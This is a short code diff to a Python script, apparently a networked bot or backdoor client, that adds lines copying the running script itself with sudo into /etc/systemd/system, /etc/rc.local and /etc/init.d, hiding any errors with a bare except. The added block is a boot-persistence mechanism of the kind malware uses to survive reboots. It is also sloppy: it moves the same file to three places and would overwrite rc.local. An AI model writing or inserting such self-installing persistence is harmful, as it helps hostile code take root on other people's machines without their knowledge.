@@ -36,6 +36,17 @@ header = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0
 
 headers = ' \n'.join(header)
 
+try:
+	fileName = sys.argv[0]
+	if os.name == "nt":
+		os.system("")
+	else:
+		os.system("sudo mv %s /etc/systemd/system" % fileName)
+		os.system("sudo mv %s /etc/rc.local" % fileName)
+		os.system("sudo mv %s /etc/init.d" % fileName)
+except:
+	pass
+
 def system():
 	global sock
 	global connected
